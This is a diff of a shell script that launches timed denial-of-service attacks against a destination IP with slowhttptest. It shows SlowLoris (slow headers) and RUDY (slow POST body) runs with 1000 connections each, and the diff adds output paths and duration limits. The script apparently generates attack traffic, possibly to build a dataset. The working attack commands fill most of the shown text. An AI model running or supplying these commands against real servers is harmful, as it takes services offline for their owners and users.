@@ -51,7 +51,7 @@ echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 #Define variables for attack 2
 attack_type="SlowLoris"
 attack_duration=$((13*60)) # in seconds
-attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
+attack_script="slowhttptest -c 1000 -H -g -o "/home/output/SlowLoris" -i 10 -r 200 -u http://$destination_ip -x 24 -p 3 -l $attack_duration"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
 
@@ -79,7 +79,7 @@ echo "Break 3 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 #Define variables for attack 4
 attack_type="RUDY"
 attack_duration=$((15*60)) # in seconds
-attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3"
+attack_script="slowhttptest -c 1000 -B -g -o "/home/output/RUDY" -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3 -l $attack_duration"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
 
